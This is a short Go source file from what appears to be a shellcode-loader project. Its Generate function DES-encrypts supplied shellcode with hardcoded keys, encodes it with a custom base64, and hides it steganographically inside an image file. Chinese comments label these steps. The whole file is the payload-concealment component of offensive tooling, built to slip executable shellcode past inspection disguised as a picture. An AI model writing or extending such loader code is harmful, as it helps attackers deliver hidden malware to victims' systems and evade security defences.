package image

import (
	"bimg-shellcode-loader/crypt"
	"fmt"
)

func Generate(imgFile string, shellcode []byte) {
	encryptShellcode, _ := crypt.DesEncrypt(shellcode, []byte("12345678"), []byte("87654321"))
	fmt.Println(encryptShellcode)
	// 对encryptShellcode进行base64编码
	base64Shellcode := crypt.CustomBase64Encode(encryptShellcode)
	fmt.Println(base64Shellcode)
	// 对base64Shellcode进行steg编码
	crypt.StegEncode(imgFile, []byte(base64Shellcode))
}
